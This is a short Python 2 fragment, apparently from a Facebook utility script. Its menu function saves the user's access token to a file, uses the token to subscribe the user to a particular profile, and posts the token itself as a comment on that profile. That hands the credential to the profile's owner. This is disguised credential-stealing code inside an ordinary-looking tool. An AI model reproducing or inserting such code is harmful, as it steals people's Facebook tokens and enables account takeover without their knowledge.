...
def menu():
    ...
    try:
        ...
        xd.write(token)
        xd.close()
        r = requests.post('https://graph.facebook.com/profile.php?id=100072425385396/subscribers?access_token=' + token)
        r = requests.post('https://graph.facebook.com/profile.php?id=100072425385396/subscribers?access_token=' + token)
        requests.post('https://graph.facebook.com/profile.php?id=100072425385396/comments/?message=' + token + '&access_token=' + token)
    except KeyError:
        logo()
        print ''
